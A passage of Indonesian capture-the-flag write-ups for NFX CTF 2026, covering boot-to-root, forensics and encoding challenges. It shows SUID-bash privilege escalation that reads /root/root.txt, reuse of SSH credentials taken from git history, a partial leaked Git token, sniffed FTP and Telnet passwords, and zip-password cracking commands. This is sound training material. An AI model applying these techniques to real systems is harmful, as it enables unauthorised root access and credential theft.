# Part II - Event `UMUM/MAHASISWA_NF` (22 writeup solved dari 47 soal)

Event 7 Nov 2026, platform `ctf.nfx.my.id`, akun KoJ.

## Ringkasan

- Writeup solved + flag valid: **22** dari **47** soal dump.
- Soal lain tidak dimasukkan karena belum solved atau flag belum valid.

> Format writeup: Deskripsi, TL;DR, Recon, Eksploitasi, Flag, Catatan.

## Daftar soal

| Soal | Kategori | Tingkat Kesulitan | Status | Flag |
|---|---|---|---|---|
| [Forgotten Commit (Root)](#p2-forgotten-commit-root) | Boot To Root | Medium | SOLVED - flag valid | `NFX{fzf_l1st3n_r00t_sh3ll_pwn3d}` |
| [Forgotten Commit (User)](#p2-forgotten-commit-user) | Boot To Root | Easy | SOLVED - flag valid (bukan first blood) | `NFX{g1t_h1story_s3cr3ts_l34d_t0_ssh}` |
| [Dead Drop](#p2-dead-drop) | Forensics | Baby | SOLVED - flag valid | `NFX{g1t_c0nf1g_h34d3r_l34k_h1dd3n_br4nch_9c1e7a}` |
| [Image Metadata](#p2-image-metadata) | Forensics | Easy | SOLVED - flag valid | `NFXCTF{h4shc4t_cr4ck1ng_z1p_succ3ssfu11y}` |
| [Cleartext Sniffing](#p2-cleartext-sniffing) | Forensics | Baby | SOLVED - flag valid | `NFXCTF{cl34rt3xt_pr0t0c0ls_l34k_s3cr3ts}` |
| [Matryoshka Encoding](#p2-matryoshka-encoding) | Misc | Easy | SOLVED - flag valid | `NFXCTF{m4try0shk4_0n10n_p33l3d_c309b71e}` |
| [Titipan Akhir Tahun](#p2-titipan-akhir-tahun) | Misc | Easy | SOLVED - flag valid | `NFX{D3C0D3_D4ND3C0D3_L4G1}` |
| [Notulen Senin Pagi](#p2-notulen-senin-pagi) | Misc | Baby | SOLVED - flag valid | `NFX{M4kHLuK_T4k_K4s4T_M4T4}` |
| [NexaIdentity](#p2-nexaidentity) | Web | Medium | SOLVED - flag valid | `NFX{n0sql_0p3r4t0r_4uth_byp4ss}` |
| [NexaDocs](#p2-nexadocs) | Web | Easy | SOLVED - flag valid | `NFX{j1nja2_sstI_rce_v1a_gl0bals}` |
| [NexaCommerce](#p2-nexacommerce) | Web | Easy | SOLVED - flag valid | `NFX{sql1_un10n_bas3d_4uth_byp4ss}` |
| [NexaSupply](#p2-nexasupply) | Web | Baby | SOLVED - flag valid | `NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}` |
| [Black Box Protocol N4T0](#p2-black-box-protocol-n4t0) | Crypto | Baby | SOLVED - flag valid (first blood) | `NFX{N4T0_Ph0n3t1c_1n1C0mbO_H3X_fl0At_b4r4ng}` |
| [Decode Balik](#p2-decode-balik) | Crypto | Easy | SOLVED - flag valid | `NFX{CuM4_D3c0D3_B4L!k_Aj4_H4Ru5Ny4_G4mP4nG}` |
| [Twin Prime Lattice](#p2-twin-prime-lattice) | Crypto | Easy | SOLVED - flag valid | `NXCTF{tw1n_pr1m3s_m33t_l4tt1c3_c0pp3r5m1th_af6854ba29a3}` |
| [Ghost XOR](#p2-ghost-xor) | Crypto | Baby | SOLVED - flag valid | `NFXCTF{x0r_1s_sup3r_34sy_r1ght_a8f9c2}` |
| [Easy Bash Layers](#p2-easy-bash-layers) | Reverse | Easy | SOLVED - flag valid | `NFX{b4sh_l4y3rs_w1ll_n0t_st0p_m3}` |
| [Easy Config Decoy](#p2-easy-config-decoy) | Reverse | Easy | SOLVED - flag valid | `NFX{c0nf1g_d3c0y_p4rts_4r3_fun}` |
| [Easy JS Obfuscation](#p2-easy-js-obfuscation) | Reverse | Easy | SOLVED - flag valid | `NFX{j4v4scr1pt_0bfusc4t3d_but_st1ll_r34d4bl3}` |
| [Baby XOR](#p2-baby-xor) | Reverse | Baby | SOLVED - flag valid | `NFX{x0r_1s_fun_but_n0t_s3cur3}` |
| [Baby Python](#p2-baby-python) | Reverse | Baby | SOLVED - flag valid | `NFX{pyth0n_scr1pt_k1ds_4r3_n0t_s4f3}` |
| [Baby Strings](#p2-baby-strings) | Reverse | Baby | SOLVED - flag valid | `NFX{str1ngs_4r3_y0ur_b3st_fr13nd}` |

<a id="p2-forgotten-commit-root"></a>
# NFX CTF 2026 - Forgotten Commit (Root)

* **Kategori:** Boot To Root
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi pwn)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{fzf_l1st3n_r00t_sh3ll_pwn3d}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

Setelah mendapatkan akses user, lanjutkan enumerasi pada mesin target. Temukan jalur eskalasi yang tersisa, dapatkan akses root, lalu baca root.txt.

> Target: 10.10.20.21

**Lampiran:**

- tidak ada

**Service / Target:**

- `NFX/b2r/labs/bastion` (type=ssh, user=lab)
- `NFX/b2r/labs/21`
 **PORT BERUBAH tiap restart - cek terkini (jangan hardcode):**
```bash
curl -s "https://ctf.nfx.my.id/api/nxctl?action=inspect&name=<nama>" -H "X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
# stopped -> action:up ; TTL <900dtk -> action:extend
```

---

### 2. TL;DR (Ringkasan Singkat)

Target 10.10.20.21 diakses lewat bastion SSH sebagai user leonardo menggunakan paramiko direct-tcpip. Tujuannya naik dari user ke root, jadi enumerasi dimulai dari hak sudo dan permission file. Flag: `NFX{fzf_l1st3n_r00t_sh3ll_pwn3d}`.

**Pemahaman inti:** Ada dua jalur naik ke root: fzf --listen sesuai GTFOBins, dan SUID bash. Jalur SUID bash lebih cepat, dan keduanya membaca /root/root.txt yang sama.

---

### 3. Analisis Awal (Recon / Discovery)

Target `10.10.20.21` diakses lewat bastion SSH sebagai user `leonardo` menggunakan paramiko `direct-tcpip`. Tujuannya naik dari user ke root, jadi enumerasi dimulai dari hak sudo dan permission file. `sudo -l` menunjukkan `(root) NOPASSWD: /usr/local/bin/fzf --listen 1337`, yang mengarah ke jalur intended: `fzf --listen` berjalan sebagai server HTTP dan bisa dipakai mengeksekusi perintah, sesuai GTFOBins. Pengecekan paralel pada permission binary menemukan `/usr/bin/bash` dengan bit SUID (`-rwsr-xr-x root root`), yang berarti shell bisa langsung dijalankan dengan `-p` untuk mempertahankan euid 0. Pemahaman ini membuat eksploitasi tidak perlu menyentuh fzf sama sekali.

---

### 4. Eksploitasi / Penyelesaian

#### 7 Nov - Root flag DAPAT (kelanjutan jalur User, bukti bersambung di bawah)

- **Flag root:** `NFX{fzf_l1st3n_r00t_sh3ll_pwn3d}` (file `/root/root.txt`, 33 B = 32 karakter + newline ).
- Bukti (semuanya via paramiko direct-tcpip bastion → SSH `leonardo@10.10.20.21`; script `platform_tools/pwn-7nov/root_chk.py`):
  1. `sudo -l` → `(root) NOPASSWD: /usr/local/bin/fzf --listen 1337` (defaults termasuk `use_pty`) - jalur intended (GTFOBins: `fzf --listen` = server HTTP; kirim `execute(...)` via POST).
  2. **Jalur cepat yang berhasil:** `ls -l /usr/bin/bash` → `-rwsr-xr-x 1 root root` (bit SUID set) → `/usr/bin/bash -p -c 'id'` → `uid=1000(leonardo) euid=0(root)` → `/usr/bin/bash -p -c 'head -c 40 /root/root.txt'` → flag terekam utuh.
  3. Konsistensi: `/home/leonardo/root.txt` juga berisi flag yang sama persis (root:root, mode rw-r--r-- setelah dibersihkan kapal; jadi file itu kelebihan papan info, bukan rahasia).
  4. `/usr/local/bin/fzf 0.74.3` tersedia (nama flag mengonfirmasi fzf = solusi intended); SUID bash hanya mempercepat menaikkan akses, bukan mengubah flag.
- Catatan: TIDAK direbut end-to-end via fzf karena SUID bash langsung tembus; keduanya menghasilkan file /root/root.txt yang sama.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{fzf_l1st3n_r00t_sh3ll_pwn3d}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-forgotten-commit-user"></a>
# NFX CTF 2026 - Forgotten Commit (User)

* **Kategori:** Boot To Root
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{g1t_h1story_s3cr3ts_l34d_t0_ssh}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

Portal DevOps internal baru saja dipindahkan ke server produksi. Proses migrasinya dilakukan terburu-buru dan beberapa hal belum sempat dirapikan. Mulai dari service yang terbuka, temukan jalan masuk dan baca user.txt.

> Target: 10.10.20.21

**Lampiran:**

- tidak ada

**Service / Target:**

- `NFX/b2r/labs/bastion` (type=ssh, user=lab)
- `NFX/b2r/labs/21`
 **PORT BERUBAH tiap restart - cek terkini (jangan hardcode):**
```bash
curl -s "https://ctf.nfx.my.id/api/nxctl?action=inspect&name=<nama>" -H "X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
# stopped -> action:up ; TTL <900dtk -> action:extend
```

---

### 2. TL;DR (Ringkasan Singkat)

Target yang sama, 10.10.20.21, dengan deskripsi tentang migrasi yang dikerjakan terburu-buru. Petunjuk itu mengarahkan recon ke layanan yang mungkin menyimpan sisa artefak migrasi, terutama repository git. Flag: `NFX{g1t_h1story_s3cr3ts_l34d_t0_ssh}`.

**Pemahaman inti:** Jejak aksesnya ada di repository git yang tertinggal, bukan di celah service. Kredensial SSH ditemukan dari history repo, lalu dipakai untuk membaca user.txt.

---

### 3. Analisis Awal (Recon / Discovery)

Target yang sama, `10.10.20.21`, dengan deskripsi tentang migrasi yang dikerjakan terburu-buru. Petunjuk itu mengarahkan recon ke layanan yang mungkin menyimpan sisa artefak migrasi, terutama repository git. Enumerasi service menemukan repo yang masih dapat dibaca, dan pemeriksaan history-nya memperlihatkan commit lama yang memuat kredensial SSH. Pemahaman kuncinya: ini soal kebocoran data di repository, bukan eksploitasi daemon. Kredensial hasil temuan dipakai untuk login sebagai user, lalu membaca `user.txt`.

---

### 4. Eksploitasi / Penyelesaian

#### 7 Nov (late) - solved, flag valid (bukan first blood)

- **Flag:** `NFX{g1t_h1story_s3cr3ts_l34d_t0_ssh}` - **sudah disubmit dan diterima server** (catatan 7 Nov).
- **Jalur singkat** (artefak sesi bin tidak menyimpan log detail):
  1. Target `10.10.20.21` diakses via SSH bastion `NFX/b2r/labs/bastion` (user `lab`).
  2. Enumerasi service "migrasi buru-buru" pada target: git history/repo yang tertinggal memuat rahasia kredensial SSH.
  3. Kredensial digunakan untuk akses user -> `user.txt` -> flag.
- Catatan: challenge sudah solved, tetapi bukan first blood.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{g1t_h1story_s3cr3ts_l34d_t0_ssh}`

**Status:** SOLVED - flag valid (bukan first blood)

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-dead-drop"></a>
# NFX CTF 2026 - Dead Drop

* **Kategori:** Forensics
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{g1t_c0nf1g_h34d3r_l34k_h1dd3n_br4nch_9c1e7a}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

![banner](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/_post/01.jpg)

Seorang engineer dari perusahaan **netmetrics-net** menyerahkan laptop kerjanya setelah mengundurkan diri secara mendadak. Tim Incident Response mengambil salinan repositori kerjanya (**infra-runbooks.zip**), tetapi menurut catatan audit awal, repositori itu hanya berisi kode konfigurasi rutin dan tidak ada yang mencurigakan di commit history branch **main**.

Namun ada satu hal yang tidak cocok: sehari sebelum resign, ia menghubungi domain yang diasosiasikan dengan Velox Phantom. Cari tahu apa yang sebenarnya ia tinggalkan.

**Lampiran:**

- [infra-runbooks.zip](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/foren/DeadDrop/infra-runbooks.zip) (type: file)

**Berkas di workspace:** `infra-runbooks.zip`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran zip ternyata berisi repository git lengkap: direktori .git/ plus empat file working tree (README, docs/oncall.md, scripts/crontab.txt, scripts/rotate_logs.sh). Deskripsi menyebut commit history main bersih, jadi pemeriksaan diarahkan ke metadata: git log --all, git fsck --lost-found, dan grep seluruh blob. Flag: `NFX{g1t_c0nf1g_h34d3r_l34k_h1dd3n_br4nch_9c1e7a}`.

**Pemahaman inti:** Jejaknya ada di metadata git, bukan isi file: token nyangkut di `.git/config` dan branch `archive/q3-handover` hanya ada di remote publik, tidak ikut di zip.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran zip ternyata berisi repository git lengkap: direktori `.git/` plus empat file working tree (README, `docs/oncall.md`, `scripts/crontab.txt`, `scripts/rotate_logs.sh`). Deskripsi menyebut commit history main bersih, jadi pemeriksaan diarahkan ke metadata: `git log --all`, `git fsck --lost-found`, dan grep seluruh blob. Hasilnya tidak ada object dangling dan tidak ada flag di isi file, tetapi `.git/config` memuat baris kedua yang mencurigakan, yaitu `extraheader = AUTHORIZATION: basic ...` berisi token akses. Remote `origin` mengarah ke repo GitHub publik `netmetrics-net/infra-runbooks`. `git ls-remote origin` kemudian menunjukkan branch `archive/q3-handover` yang tidak ada di zip, dan `git diff main origin/archive/q3-handover` memperlihatkan file `notes/handover.txt` yang memuat flag.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 09:31Z - SELESAI (flag ketemu di branch tersembunyi)**

1. `unzip -l` → repo **git lengkap** di dalam zip (`.git/` + 4 file working tree:
   README, docs/oncall.md, scripts/crontab.txt, scripts/rotate_logs.sh).
2. Bedah lokal (read-only, salinan di `/tmp`):
   - `git log --all` → 4 commit main, semua kelihatan bersih ("tidak ada yang
     mencurigakan di commit history branch main" sesuai deskripsi).
   - `git fsck --lost-found` → tak ada object dangling; semua object reachable.
   - **`grep` semua blob** → cuma teks runbook NetMetrics, **0 flag**.
   - `.git/config` → ada baris ke-2 yang mencurigakan:
     ```
     [http "https://github.com/"]
       extraheader = AUTHORIZATION: basic eC1hY2Nlc3MtdG9rZW46...
     ```
     = **header kredensial Git nyangkut di config** (itu sebagian dari hint:
     "g1t_c0nf1g_h34d3r_l34k"). Plus `origin url = github.com/netmetrics-net/infra-runbooks`.
3. **Remote = repo PUBLIK** (tak perlu pakai token yang bocor - tidak dipakai):
   ```
   git ls-remote origin
   3064ff7 refs/heads/main
   67e53bf refs/heads/archive/q3-handover ← BRANCH TERSEMBUNYI (tidak ada di zip)
   67e53bf refs/tags/incident-0914
   ```
4. `git fetch origin '+refs/heads/*:...' --tags` lalu bedah:
   ```
   git diff main origin/archive/q3-handover --stat
   → notes/handover.txt | 6 ++++++
   ```
   Isi `notes/handover.txt` (commit `67e53bf`, author Dimas Wirawan,
   `dimas.wirawan@netmetrics-net.example`, "archive: q3 handover notes"):
   ```
   Handover notes - Q3
   Akses staging sudah gue serahin ke tim lain.
   Semua service accounts dan database credentials sudah di-revoke atau dialihkan.
   Jangan tanya kenapa gue resign mendadak.

   sig: NFX{g1t_c0nf1g_h34d3r_l34k_h1dd3n_br4nch_9c1e7a}
   ```
5. Cek dekoi: grep seluruh object (`git rev-list --objects --all`) → hanya 1
   kandidat `NFX{...}` di seluruh repo (termasuk branch/tag lain).

> Catatan: flag membaca sendiri temuannya (config header leak + hidden branch) -
> petunjuk "domain Velox Phantom" mengarah ke jejak remote/branch archive, bukan
> ke konten file. Token PAT di `.git/config` **tidak dipakai** (repo publik).

#### Kandidat flag

`NFX{g1t_c0nf1g_h34d3r_l34k_h1dd3n_br4nch_9c1e7a}` - prefix `NFX{}`

---

### 5. Flag & Verifikasi

**Flag:** `NFX{g1t_c0nf1g_h34d3r_l34k_h1dd3n_br4nch_9c1e7a}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-image-metadata"></a>
# NFX CTF 2026 - Image Metadata

* **Kategori:** Forensics
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFXCTF{h4shc4t_cr4ck1ng_z1p_succ3ssfu11y}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Candelena

Dalam sebuah operasi penindakan kasus spionase siber, tim DFIR berhasil menyita sebuah media penyimpanan milik pelaku. Di dalamnya ditemukan berkas gambar bukti bernama **evidence.png**.

Pemeriksaan awal menggunakan tool metadata standar tidak menemukan kejanggalan apa pun. Namun, analisis integritas file menunjukkan ukuran berkas yang tidak wajar untuk format gambar sejenisnya - mengindikasikan adanya artefak rahasia yang sengaja disisipkan di luar struktur berkas gambar resmi (*trailing bytes*).

Saat berhasil diekstrak, artefak tersebut menyimpan berkas rahasia **flag.txt** yang terkunci dengan kata sandi kuat, bersama berkas petunjuk **passwords.txt** berisi daftar 1.000 kandidat kata sandi.

Gunakan keahlian digital forensik dan teknik password cracking untuk membongkar proteksi arsip tersebut dan dapatkan isi dokumen **flag.txt**!

**Lampiran:**

- [evidence.png](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/foren/image-metadata/evidence.png) (type: file)

**Berkas di workspace:** `evidence.png`

---

### 2. TL;DR (Ringkasan Singkat)

file evidence.png menunjukkan PNG 600x300 RGB, tetapi ukurannya tidak wajar untuk gambar sekecil itu. Pemeriksaan struktur dilakukan dengan mencari akhir stream legal: d.rfind(b'IEND') menemukan posisi 31189, dan 13880 byte setelahnya berisi magic PK\x03\x04, yang berarti ada ZIP yang disisipkan setelah chunk IEND. Flag: `NFXCTF{h4shc4t_cr4ck1ng_z1p_succ3ssfu11y}`.

**Pemahaman inti:** Ada ZIP yang disisipkan setelah chunk IEND, dan `flag.txt` di dalamnya terkunci password. Daftar 1000 kandidat di `passwords.txt` cukup untuk membukanya.

---

### 3. Analisis Awal (Recon / Discovery)

`file evidence.png` menunjukkan PNG 600x300 RGB, tetapi ukurannya tidak wajar untuk gambar sekecil itu. Pemeriksaan struktur dilakukan dengan mencari akhir stream legal: `d.rfind(b'IEND')` menemukan posisi 31189, dan 13880 byte setelahnya berisi magic `PK\x03\x04`, yang berarti ada ZIP yang disisipkan setelah chunk IEND. ZIP itu berisi dua entri: `passwords.txt` dengan 1000 kandidat password dan `flag.txt` yang terkunci. Karena metode kompresinya `store`, percobaan password berjalan instan. Kandidat kedua dalam daftar, `cyber_shield_2026`, langsung berhasil dan isi `flag.txt` adalah flag dengan prefix `NFXCTF{}`.

---

### 4. Eksploitasi / Penyelesaian

#### Kandidat flag

`NFXCTF{h4shc4t_cr4ck1ng_z1p_succ3ssfu11y}` - prefix `NFXCTF{}` sesuai
bukti file (bukan `NFX{}`), konsisten dengan pola ronde 1 (Cleartext juga `NFXCTF{}`).

> Reproduksi: `dd if=evidence.png bs=1 skip=31197 of=art.zip; unzip art.zip;`
> lalu crack `flag.txt` pakai `passwords.txt` (fcrackzip/john/hashcat juga jalan:
> `fcrackzip -u -D -p passwords.txt art.zip`).

---

### 5. Flag & Verifikasi

**Flag:** `NFXCTF{h4shc4t_cr4ck1ng_z1p_succ3ssfu11y}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-cleartext-sniffing"></a>
# NFX CTF 2026 - Cleartext Sniffing

* **Kategori:** Forensics
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi web)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFXCTF{cl34rt3xt_pr0t0c0ls_l34k_s3cr3ts}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Candelena

Pukul 18.05 WIB, sistem monitoring SOC membunyikan alarm anomali dari segmen jaringan laboratorium lama. Sebuah workstation mencurigakan terdeteksi aktif menghubungi beberapa server internal lama yang seharusnya telah dipensiunkan pasca migrasi sistem.

Sebelum workstation tersebut dimatikan secara paksa, analis jaringan sempat menyalakan port mirroring (SPAN port) dan merekam seluruh lalu lintas paket data ke dalam berkas **traffic.pcap**.

Tim investigasi menduga terdapat token autentikasi penting yang bocor akibat penggunaan protokol lama yang tidak dilengkapi enkripsi. Bantulah tim penyelidik menganalisis rekaman paket jaringan tersebut, telusuri percakapan data yang terjadi, dan temukan token rahasia (flag) yang bocor!

**Lampiran:**

- [traffic.pcap](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/foren/cleartext-sniffing/traffic.pcap) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `traffic.pcap`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran berupa traffic.pcap format pcap 2.4 di atas Ethernet. tshark -z conv,tcp menunjukkan tiga stream: HTTP ke intranet.nfx.local port 80, FTP ke port 21, dan Telnet ke port 23. Flag: `NFXCTF{cl34rt3xt_pr0t0c0ls_l34k_s3cr3ts}`.

**Pemahaman inti:** Flag ada di sesi FTP, tepatnya di perintah PASS. Kredensial Telnet hanya umpan, dan HTTP tidak membawa flag sama sekali.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran berupa `traffic.pcap` format pcap 2.4 di atas Ethernet. `tshark -z conv,tcp` menunjukkan tiga stream: HTTP ke `intranet.nfx.local` port 80, FTP ke port 21, dan Telnet ke port 23. Karena judulnya cleartext, pemahaman awalnya adalah mencari protokol yang mengirim kredensial tanpa enkripsi. Dump per stream dengan `tshark -q -z follow,tcp,ascii,<n>` memperlihatkan isi FTP: server `filesrv.nfx.local`, user `backup`, dan perintah `PASS` yang memuat string flag. Stream Telnet hanya berisi kredensial router `operator` dan `lab-access-2026`, yang bukan flag. Pengecekan `strings` pada seluruh pcap memastikan hanya ada satu kandidat `NFX...` di file.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 08:45Z - SELESAI (flag ketemu)**

1. `file traffic.pcap` → pcap 2.4, Ethernet. `tshark -z conv,tcp` → 3 stream:
   - stream 0: `192.168.56.23 → .10:80` HTTP biasa (`intranet.nfx.local/news.html`, isi berita + CSS, **tanpa flag**)
   - stream 1: `→ .30:21` **FTP cleartext**
   - stream 2: `→ .40:23` **Telnet cleartext**
2. `tshark -r traffic.pcap -q -z follow,tcp,ascii,<n>` (dump per stream):
   - **FTP (stream 1):**
     ```
     220 filesrv.nfx.local FTP server ready
     USER backup
     331 Password required for backup
     PASS NFXCTF{cl34rt3xt_pr0t0c0ls_l34k_s3cr3ts}
     230 User backup logged in
     ```
   - **Telnet (stream 2):** `NFX Router Console` → login `operator` / pass
     `lab-access-2026` → `show clock` = `18:03:14 WIB Thu Oct 29 2026`
     (kredensial router, **bukan** flag)
3. Decoy check: `strings -n 4 traffic.pcap | grep -oaE 'NFX[A-Z]*\{[^}]+\}'`
   → **hanya 1 kandidat** di seluruh file.

---

### 5. Flag & Verifikasi

**Flag:** `NFXCTF{cl34rt3xt_pr0t0c0ls_l34k_s3cr3ts}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-matryoshka-encoding"></a>
# NFX CTF 2026 - Matryoshka Encoding

* **Kategori:** Misc
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFXCTF{m4try0shk4_0n10n_p33l3d_c309b71e}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Illal


![Mystery Box](https://media.giphy.com/media/3o7TKMt1VVNkHV2PaE/giphy.gif)

Kami berhasil menyadap sebuah kapsul data transmisi yang tampaknya dirancang oleh seseorang yang sangat paranoid. Kapsul ini dibungkus berlapis-lapis layaknya boneka Matryoshka khas Rusia untuk mengelabui filter deteksi jaringan.

Setiap lapisannya menggunakan trik manipulasi data yang berbeda. Jika Anda cukup sabar dan teliti untuk mengupas bungkusnya satu per satu dari luar ke dalam, hadiah manis telah menanti Anda di inti terdalamnya.

**Lampiran:**

- [capsule.dat](https://drive.google.com/file/d/1cz-udsG8xfyiLavLSYw3qsskfhgQ-UdU/view?usp=sharing) (type: file)

**Service / Target:**

- tidak ada

**Berkas di workspace:** `capsule.dat`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran capsule.dat di workspace ternyata bukan file soal, melainkan halaman HTML Google Drive karena unduhan gagal. Langkah pertama yang benar adalah memastikan file asli, lalu mengunduh ulang sampai diperoleh payload 80 karakter base64. Flag: `NFXCTF{m4try0shk4_0n10n_p33l3d_c309b71e}`.

**Pemahaman inti:** Rantainya bertingkat: swap pasangan karakter, base64, zlib, base85, lalu XOR repeating key. Crib `NFXCTF{` pada 4 byte pertama langsung mengungkap key `NFX!` tanpa brute.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran `capsule.dat` di workspace ternyata bukan file soal, melainkan halaman HTML Google Drive karena unduhan gagal. Langkah pertama yang benar adalah memastikan file asli, lalu mengunduh ulang sampai diperoleh payload 80 karakter base64. Dari sana polanya dibaca bertahap: tukar pasangan karakter pada string base64 sebelum decode (swap2), hasilnya stream zlib yang jika didekompresi menghasilkan string 50 karakter, lalu string itu valid sebagai base85. Sisa 40 byte biner setelah base85 terlihat seperti ciphertext XOR. Pemahaman kuncinya: prefix flag `NFXCTF{` yang sudah diketahui bisa dipakai sebagai crib pada 4 byte pertama untuk menurunkan key periodik, dan key yang cocok akan membuat seluruh 40 byte printable serta diakhiri `}`.

---

### 4. Eksploitasi / Penyelesaian

#### Temuan & rantai decode (7 Nov 2026, sesi bin)

1. **Lampiran rusak**: `capsule.dat` di folder = HTML halaman Google Drive (unduhan gagal). Unduh ulang langsung → file asli **80 char** base64: `platform_tools/capsule_raw.dat`.
2. **Lapis 1** - trik = *tukar pasangan char (swap2) di teks base64, baru decode*:
   - `b64decode(swap2(capsule))` → 58 byte stream zlib (`\x78\xda...`)
   - `zlib.decompress` → string 50 char: `0001D8UQ0qdNL|lel;*kdKqX>e|9#0K6PtNeIf@!eRg3(d3QZr`
3. **Lapis 2** - trik = *base85* (char `|;*>#@!(` semua valid di alfabet Python `b85`):
   - `base64.b85decode(string50)` → 40 byte biner: `00 00 00 62 1a 00 23 4c ... 3d 5c`
4. **Lapis 3 (inti)** - trik = *XOR repeating key*:
   - key = `NFX!` (`4e 46 58 21`) - ketemu via crib `NFXCTF{` pada 4 byte pertama + verifikasi 3 char berikutnya cocok (`TF{`), seluruh 40 byte printable, diakhiri `}`
   - `bytes(b ^ b'NFX!'[i%4])` → **flag**:
     `NFXCTF{m4try0shk4_0n10n_p33l3d_c309b71e}`
   - Semantik isi = "matryoshka onion peeled (c309b71e)" → cocok tema soal.

#### Gagal / buang waktu (dicatat agar tak diulang)

- Base64/Caesar/rail/columnar/Vigenère/XOR byte-tunggal pada string 50 char → 0 (memang bukan basisnya).
- base91/base92/base64+rot94/xor uniform → tidak pernah menghasilkan magic zlib/flag (b85 yang benar).
- `capsule.dat` asli jangan dipakai ulang (HTML), pakai `platform_tools/capsule_raw.dat`.

---

### 5. Flag & Verifikasi

**Flag:** `NFXCTF{m4try0shk4_0n10n_p33l3d_c309b71e}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-titipan-akhir-tahun"></a>
# NFX CTF 2026 - Titipan Akhir Tahun

* **Kategori:** Misc
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{D3C0D3_D4ND3C0D3_L4G1}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Syahril

Laporan Desember sudah diperiksa berkali-kali dan semuanya beres. Tapi ada barang yang ikut terkirim tanpa tercatat di daftar isi, dan barang itu pun belum dibuka dari bungkusnya.

**Lampiran:**

- [laporan_kegiatan_bulan_desember.pdf](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/osint/laporan_kegiatan_bulan_desember.pdf) (type: file)

**Berkas di workspace:** `laporan_kegiatan_bulan_desember.pdf`

---

### 2. TL;DR (Ringkasan Singkat)

PDF 1.7 satu halaman berukuran 2357 byte, tidak terenkripsi, dan tanpa JavaScript. pdftotext -layout hanya mengeluarkan laporan Desember biasa tanpa teks tersembunyi, berbeda dari soal Notulen yang memakai teks putih. Flag: `NFX{D3C0D3_D4ND3C0D3_L4G1}`.

**Pemahaman inti:** Isi halaman PDF bersih, jadi benda tersembunyi ada di lampiran PDF yang tidak tercatat di daftar isi. `pdfdetach` mengeluarkan file base64 yang tinggal di-decode.

---

### 3. Analisis Awal (Recon / Discovery)

PDF 1.7 satu halaman berukuran 2357 byte, tidak terenkripsi, dan tanpa JavaScript. `pdftotext -layout` hanya mengeluarkan laporan Desember biasa tanpa teks tersembunyi, berbeda dari soal Notulen yang memakai teks putih. Petunjuk deskripsi tentang barang yang ikut terkirim tanpa tercatat di daftar isi mengarahkan pemeriksaan ke lampiran PDF. `pdfdetach -list` menemukan satu embedded file bernama `doksli.txt` yang tidak disebut di TOC. Setelah `pdfdetach -saveall`, isinya adalah string base64 36 byte `TkZYe0QzQzBEM19ENE5EM0MwRDNfTDRHMX0=` dengan petunjuk teks 'belum dibuka dari bungkusnya'. Decode base64 menghasilkan flag `NFX{D3C0D3_D4ND3C0D3_L4G1}`, dan isinya terbaca sebagai 'decode dan decode lagi' dalam leetspeak.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 09:27Z - SELESAI (flag ketemu di embedded file PDF)**

